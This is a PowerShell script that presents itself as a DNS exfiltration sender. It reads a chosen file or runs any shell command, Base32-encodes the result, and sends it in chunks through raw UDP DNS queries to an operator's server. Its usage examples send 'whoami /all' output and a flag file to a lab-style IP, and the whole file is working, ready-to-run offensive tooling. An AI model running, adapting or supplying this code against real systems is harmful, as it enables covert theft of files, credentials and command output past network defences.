<#
.SYNOPSIS
    DnsOut-Send.ps1 - DNS exfiltration sender for Windows (PowerShell rewrite)

.DESCRIPTION
    Exfiltrates data via DNS A-record queries. Pure PowerShell - no Python needed.
    Receiver: python3 dnsout.py recv --port 5353 (or the Python receiver on your server)

.PARAMETER Server
    IP of your DNS receiver.

.PARAMETER Domain
    Base domain for exfil queries (default: x.local).

.PARAMETER Port
    DNS port (default: 53).

.PARAMETER File
    File to exfiltrate.

.PARAMETER Command
    Shell command - exfiltrate its output.

.PARAMETER Delay
    Milliseconds between queries (default: 200).

.PARAMETER ChunkSize
    Characters per DNS label (default: 28, max 30).

.EXAMPLE
    .\DnsOut-Send.ps1 -Server 10.10.14.5 -File C:\Users\user\Documents\secret.txt
    .\DnsOut-Send.ps1 -Server 10.10.14.5 -Command "whoami /all" -Domain exfil.mysite.com
    .\DnsOut-Send.ps1 -Server 10.10.14.5 -Command "type C:\flag.txt" -Port 5353
#>
param(
    [Parameter(Mandatory)] [string]$Server,
    [string]$Domain    = "x.local",
    [int]   $Port      = 53,
    [string]$File      = "",
    [string]$Command   = "",
    [int]   $Delay     = 200,
    [int]   $ChunkSize = 28
)

# -- Encoding helpers -----------------------------------------------------------
function ConvertTo-Base32 {
    param([byte[]]$Bytes)
    $alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
    $result   = [System.Text.StringBuilder]::new()
    $bits = 0; $accumulator = 0

    foreach ($b in $Bytes) {
        $accumulator = ($accumulator -shl 8) -bor $b
        $bits += 8
        while ($bits -ge 5) {
            $bits -= 5
            $result.Append($alphabet[($accumulator -shr $bits) -band 0x1F]) | Out-Null
        }
    }
    if ($bits -gt 0) {
        $result.Append($alphabet[($accumulator -shl (5 - $bits)) -band 0x1F]) | Out-Null
    }
    return $result.ToString().ToLower()
}

# -- DNS query (raw UDP) --------------------------------------------------------
function Send-DnsQuery {
    param([string]$QName, [string]$DnsServer, [int]$DnsPort)
    try {
        # Build minimal DNS query packet
        $txId   = [byte[]](Get-Random -Max 256), (Get-Random -Max 256)
        $flags  = [byte[]]0x01, 0x00
        $counts = [byte[]]0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

        # Encode QNAME
        $qnameBytes = [System.Collections.Generic.List[byte]]::new()
        foreach ($label in $QName.TrimEnd(".").Split(".")) {
            $lb = [System.Text.Encoding]::ASCII.GetBytes($label)
            $qnameBytes.Add([byte]$lb.Length)
            $qnameBytes.AddRange($lb)
        }
        $qnameBytes.Add(0x00)

        $qtype = [byte[]]0x00, 0x01, 0x00, 0x01  # A record, IN class

        $packet = $txId + $flags + $counts + $qnameBytes.ToArray() + $qtype

        $udp = [System.Net.Sockets.UdpClient]::new()
        $udp.Client.SendTimeout = 2000
        $udp.Send($packet, $packet.Length, $DnsServer, $DnsPort) | Out-Null
        $udp.Close()
    } catch { }
}

# -- Session ID -----------------------------------------------------------------
function New-SessionId {
    $bytes = [byte[]](1..4 | ForEach-Object { Get-Random -Max 256 })
    return ConvertTo-Base32 $bytes
}

# -- Main send logic ------------------------------------------------------------
function Send-Data {
    param([byte[]]$Data)

    $sid      = New-SessionId
    $encoded  = ConvertTo-Base32 $Data
    $chunk    = [Math]::Min($ChunkSize, 30)
    $chunks   = @()
    for ($i = 0; $i -lt $encoded.Length; $i += $chunk) {
        $chunks += $encoded.Substring($i, [Math]::Min($chunk, $encoded.Length - $i))
    }
    $total = $chunks.Count

    Write-Host "[*] Session   : $sid"
    Write-Host "[*] Payload   : $($Data.Length) bytes -> $($encoded.Length) chars -> $total queries"
    Write-Host "[*] DNS server: ${Server}:$Port"
    Write-Host "[*] Domain    : $Domain`n"

    # Signal start
    Send-DnsQuery "$sid.start.$total.$Domain" $Server $Port
    Start-Sleep -Milliseconds $Delay

    for ($i = 0; $i -lt $total; $i++) {
        $qname = "$($chunks[$i]).$sid.$i.$Domain"
        Send-DnsQuery $qname $Server $Port
        if ($i % 10 -eq 0) { Write-Host "`r  Sent $($i+1)/$total" -NoNewline }
        Start-Sleep -Milliseconds $Delay
    }

    Write-Host ""
    # Signal end
    Send-DnsQuery "$sid.end.$total.$Domain" $Server $Port
    Write-Host "[+] Done - $total queries sent for session $sid"
}

# -- Entry point ----------------------------------------------------------------
if ($File) {
    Write-Host "[*] Exfiltrating file: $File"
    $data = [IO.File]::ReadAllBytes($File)
} elseif ($Command) {
    Write-Host "[*] Running: $Command"
    $output = cmd /c $Command 2>&1 | Out-String
    $data   = [System.Text.Encoding]::UTF8.GetBytes($output)
    Write-Host "[*] Output: $($data.Length) bytes"
} else {
    Write-Error "Specify -File or -Command"
    exit 1
}

Send-Data $data
